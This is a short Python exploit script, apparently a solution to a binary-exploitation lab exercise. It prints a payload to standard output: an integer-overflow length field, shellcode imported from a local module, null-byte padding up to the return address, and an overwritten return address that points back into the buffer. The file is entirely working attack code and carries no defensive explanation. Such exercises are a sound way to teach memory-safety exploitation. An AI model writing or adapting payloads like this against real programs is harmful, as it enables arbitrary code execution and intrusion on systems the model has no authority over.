#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(pack("<I", 0x40000005))  # integer overflow
sys.stdout.buffer.write(shellcode)  # buf[0] = shellcode
sys.stdout.buffer.write(b"\0" * 21)  # overwrite everything until ret
sys.stdout.buffer.write(pack("<I", 0xfffeb2e0))  # ret = buf
